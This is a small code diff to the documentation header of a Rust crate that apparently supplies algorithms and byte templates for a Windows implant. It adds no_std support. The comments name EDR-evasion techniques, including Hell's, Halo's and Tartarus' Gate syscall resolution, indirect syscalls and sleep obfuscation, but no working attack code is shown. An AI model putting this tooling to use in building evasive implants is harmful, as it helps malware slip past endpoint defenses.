@@ -4,6 +4,10 @@
 //! the PIC implant (`crates/implant-win`); this crate holds the algorithms and
 //! byte templates those feed, written so they compile and test on any host.
 //!
+//! `#![no_std]`-portable so the PIC implant can link it without pulling in std
+//! (which would duplicate the panic_impl lang item). Uses `alloc` for Vec.
+//! Integration tests (tests/ssn.rs) link std themselves.
+//!
 //! What's here:
 //! - [`syscalls`] — syscall-number (SSN) resolution: Hell's Gate, Halo's Gate,
 //!   Tartarus' Gate, over an abstract [`syscalls::SyscallSource`]. EDRs hook
@@ -26,6 +30,10 @@
 //! - Tartarus' Gate — Paul Laîné: sort-by-address, tolerates gaps.
 //! - Indirect syscalls — SysWhispers2/3, RedOps; return-address legitimacy.
 //! - `hypnus` (joaoviictorti) — proves Rust sleep-obf + stack-spoof is viable.
+
+#![no_std]
+
+extern crate alloc;
 
 pub mod stub;
 pub mod syscalls;
